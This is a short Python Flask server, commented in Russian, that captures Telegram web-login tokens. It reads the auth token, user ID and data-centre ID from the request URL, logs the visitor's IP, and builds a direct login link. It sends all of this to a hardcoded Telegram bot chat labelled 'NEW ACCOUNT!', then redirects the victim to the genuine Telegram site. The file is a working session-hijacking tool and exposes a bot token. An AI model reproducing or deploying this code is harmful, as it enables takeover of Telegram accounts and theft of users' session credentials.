
from flask import Flask, request, redirect
import requests
import os
from datetime import datetime

app = Flask(__name__)

# ТВОИ ДАННЫЕ
BOT_TOKEN = "8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4"
CHAT_ID = "8220267007"

@app.route('/')
def index():
    try:
        # Логируем в Railway
        print(f"🚀 ЗАПРОС: {request.url}")
        
        # Получаем параметры
        token = request.args.get('tgWebAuthToken')
        user_id = request.args.get('tgWebAuthUserId')
        dc_id = request.args.get('tgWebAuthDcId', '2')
        
        # Получаем IP
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        print(f"📦 Данные: token={token}, user={user_id}")
        
        # Если есть токен - отправляем
        if token and user_id:
            login_url = f"https://web.telegram.org/k/#tgWebAuthToken={token}&tgWebAuthUserId={user_id}&tgWebAuthDcId={dc_id}"
            
            message = (
                f"🔥 НОВЫЙ АККАУНТ!\n"
                f"👤 User: {user_id}\n"
                f"🔑 Token: {token}\n"
                f"🌐 DC: {dc_id}\n"
                f"📱 IP: {ip}\n"
                f"🔗 {login_url}"
            )
            
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": message},
                timeout=5
            )
            print(f"📤 Telegram: {r.status_code}")
        
        # Редирект
        return redirect('https://web.telegram.org/k/')
        
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return redirect('https://web.telegram.org/k/')

# Для локального запуска
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
